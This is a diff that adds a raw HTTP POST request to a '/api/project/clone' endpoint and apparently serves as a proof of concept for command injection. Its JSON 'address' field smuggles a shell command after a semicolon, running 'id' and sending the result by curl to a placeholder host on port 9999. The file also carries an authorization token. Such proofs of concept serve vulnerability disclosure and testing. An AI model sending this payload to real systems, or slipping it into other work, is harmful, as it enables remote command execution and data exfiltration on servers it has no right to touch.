@@ -1,0 +1,12 @@
+POST /api/project/clone HTTP/1.1
+Host: 
+Content-Length: 61
+Accept: application/json, text/plain, */*
+Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
+Content-Type: application/json;charset=UTF-8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+Connection: close
+
+{"address":"http://127.0.0.1;curl xxx.xxx.xxx.xxx:9999?`id`"}
